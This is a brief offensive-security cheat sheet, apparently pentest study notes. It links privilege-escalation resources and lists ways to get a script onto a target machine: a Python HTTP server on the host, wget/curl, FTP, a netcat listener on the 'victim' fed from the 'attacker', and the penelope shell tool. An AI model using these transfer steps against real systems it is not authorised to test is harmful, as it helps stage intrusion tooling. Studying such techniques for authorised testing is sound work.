Windows
=> https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-how-it-works

Linux
=> https://payatu.com/guide-linux-privilege-escalation
=> https://www.udemy.com/course/linux-privilege-escalation/

There are multiple ways to get the script on your target

* Open a text editor, copy-paste it
  * run it `bash script.sh`,
  * or use chmod, then `./script.sh`
* Use `wget` / `curl`
* Use `python` <small>(`sudo python -m http.server 80` on the host)</small>
* Use `FTP`
* Use nc/netcat
  * On the victim: `nc -l -p port > script.sh`
  * On the attacker: `nc IP port < script.sh`
* Using [penelope](https://github.com/brightio/penelope)